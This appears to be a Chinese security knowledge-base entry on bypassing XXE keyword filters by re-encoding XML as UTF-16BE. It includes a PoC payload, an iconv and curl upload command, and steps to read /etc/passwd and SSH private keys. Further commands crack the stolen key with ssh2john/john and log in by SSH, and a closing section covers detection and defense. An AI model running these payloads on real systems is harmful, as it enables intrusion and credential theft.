---
id: web-generic-xxe-utf16be-encoding-filter-bypass
title: XML 上传点 XXE 过滤绕过：UTF-16BE 编码隐藏 DOCTYPE 并读取 SSH 私钥
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-utf16be-encoding-filter-bypass
aliases:
- XXE UTF-16BE 绕过
- 编码绕过 XXE
- UTF-16 编码 XML 外部实体
- 上传 XML XXE 读私钥
- DOCTYPE 关键字过滤绕过
tags:
- xxe
- utf-16be
- encoding-bypass
- file-read
- xml-upload
- ssh-key
- filter-bypass
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:44:35+08:00'
  notes: 已对照原文与图05/06/07核对：UTF-8 载荷被 400 拦截，UTF-16BE 转换后回显 OPENSSH 私钥，ssh2john/john 破解后登录 git；步骤与截图一致；未复跑
---

## 一句话结论

XML 上传/导入点对经典 XXE 载荷返回“不允许”时，把同一份带外部实体的 XML 转成 UTF-16BE 再上传，字符串黑名单会因每个 ASCII 字符之间插入 NUL 字节而匹配失败，但 XML 解析器按编码声明正确解码后仍会展开外部实体，从而读取 `/etc/passwd`、SSH 私钥等任意进程可读文件。

## 原理

- 常见防护是在上传内容里按字节搜索 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://` 等特征，命中就拒绝。若过滤发生在解析之前，且只按 UTF-8/ASCII 字节判断，就存在编码盲区。
- UTF-16BE 把每个 ASCII 字符编码为两个字节（前一字节为 0x00），例如 `<` 变成 `00 3C`、`D` 变成 `00 44`；原始字节流中不会出现连续的 `<!DOCTYPE` 字符串，黑名单因此放行。
- XML 解析器在解析前读取 BOM，或读取 `<?xml version="1.0" encoding="UTF-16BE"?>` 声明，按 UTF-16BE 解码后得到与原 UTF-8 文档完全等价的逻辑内容，DOCTYPE、实体声明和 `&xxe;` 引用全部恢复。
- 解析器默认允许外部实体时（未设置 `disallow-doctype-decl`，也未禁用 general/parameter entities），`SYSTEM "file:///etc/passwd"` 会被当作 URI 打开，文件内容替换进实体位置。
- 之所以最终能读到私钥，是因为应用把导入结果回显在响应里（如 JSON 的 `data` 数组），形成有回显 XXE；进程对目标文件有读权限即可。拿到的是加密的 OpenSSH 私钥，仍需离线爆破口令才能登录。
- 该绕过针对的是“字节级关键字过滤”这一实现缺陷，不是解析器漏洞；只要过滤在规范化编码之后、或在解析器层禁用外部实体，绕过即失效。

## 触发条件

- 存在接受 XML 文件或 XML 请求体的上传/导入接口，且会解析其中的 XML。
- 服务端对 XML 做关键字黑名单过滤，且过滤发生在编码归一化之前；UTF-8 经典载荷被拦截时可作为绕过候选。
- XML 解析器允许 DOCTYPE 与外部实体。
- 应用将解析结果、导入内容或错误信息回显给用户（有回显）；无回显时需改用参数实体 OOB 外带。
- Web 进程对目标文件有读权限。

## 利用步骤

1. 先用 UTF-8 的经典载荷（`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`）确认接口会解析 XML、且被过滤拦截；记录响应文案与状态码。
2. 写一份声明 `encoding="UTF-16BE"` 的载荷文件，用 `iconv -f utf-8 -t utf-16be payload.xml > payload_utf16be.xml` 转换；也可用 Python `"".encode("utf-16-be")` 或编辑器另存为 UTF-16BE。
3. 以原文件名后缀 `.xml`、`Content-Type: text/xml` 上传，保持登录会话 Cookie/Token 不变；如接口要求 multipart 字段名，沿用正常导入请求的字段。
4. 观察响应中的 `data`/解析结果是否包含 `/etc/passwd` 文本；确认有回显后，把 `SYSTEM` 指向 `/home/<user>/.ssh/id_rsa`、`/root/.ssh/id_rsa`、应用配置等。
5. 若读到的私钥带口令，用 `ssh2john id_rsa > id_rsa.hash` 提取哈希，`john --wordlist=rockyou.txt id_rsa.hash` 离线爆破；成功后 `chmod 600 id_rsa && ssh -i id_rsa <user>@target`。
6. 若接口无回显，改用参数实体 + 外部 DTD 把文件内容拼到攻击者 HTTP/DNS 请求中外带。

## PoC

```xml
<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```bash
iconv -f utf-8 -t utf-16be payload.xml > payload_utf16be.xml

# 以正常导入请求的会话与字段上传；boundary 用实际的
curl -s -b 'session=<cookie>' \
  -F 'xmlFile=@payload_utf16be.xml;type=text/xml;filename=payload_utf16be.xml' \
  http://target/api/import.php
```

```text
# 有回显时的响应形态
{"success":true,"message":"Data imported successfully",
 "data":["root:x:0:0:root:/root:/bin/bash\n..."]}
```

```bash
# 读到 OpenSSH 私钥后爆破口令
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
chmod 600 id_rsa
ssh -i id_rsa git@target
```

## 变体与关联

- 变体：UTF-16LE、UTF-32BE/LE、带 BOM 的 UTF-8/UTF-16；也可尝试声明与实际字节不一致（声明 UTF-8、内容 UTF-16）以绕过只检查声明或只检查字节的实现。
- 变体：用 `php://filter/convert.base64-encode/resource=/etc/passwd` 读取含 XML 特殊字符的文件；用 `http://` 实体做 SSRF 探测内网；`expect://` 在扩展可用时可进一步命令执行。
- 变体：参数实体 + 远程 DTD 做盲 XXE 外带，绕过“无回显”限制；SVG、DOCX、XLSX 等容器型上传也会被服务端解析 XML。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（默认不安全解析器的基线场景）、[[web-generic-xxe-oob-exfil]]（盲 XXE 外带）、[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（实体触发 SSRF）、[[web-generic-file-inclusion-windows-sam-ntlm-crack]]（SSH/系统文件读取后的凭据利用）。
- 边界：解析器已禁用 DOCTYPE 或外部实体、过滤在解码后执行、上传被白名单限制为不含 XML 的类型、或进程无文件读权限时，本绕过不成立。

## 检测与防御

- **正确修复顺序**：不要依赖关键字黑名单。解析器层设置 `libxml_disable_entity_loader(true)`（旧 PHP）或 `LIBXML_NONET`/`LIBXML_NOENT` 之外的安全选项，并显式拒绝 DOCTYPE；Java 侧设置 `disallow-doctype-decl=true`、禁用 general/parameter entities。XXE 防护必须发生在解析器，不是字符串过滤。
- **编码归一化**：如确需过滤，先按 BOM/声明把内容解码为 UTF-8 再检查；同时拒绝 XML 中的 UTF-16/UTF-32 编码或直接只接受 UTF-8。
- **最小权限**：Web 进程使用低权限账户，禁止读取私钥、应用密钥与系统敏感文件；私钥使用强口令并限制权限 600。
- **上传控制**：限制上传类型、大小与解析器版本；导入类接口放在隔离环境执行，限制出网与文件系统访问。
- **检测**：上传内容出现 NUL 字节、UTF-16/UTF-32 BOM 或非 UTF-8 编码声明；请求体包含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`；响应中出现 `root:x:0:0`、`BEGIN OPENSSH PRIVATE KEY`、`BEGIN RSA PRIVATE KEY`；Web 进程异常读取 SSH 目录或 `/etc/passwd`；导入后出现异常 SSH 登录。

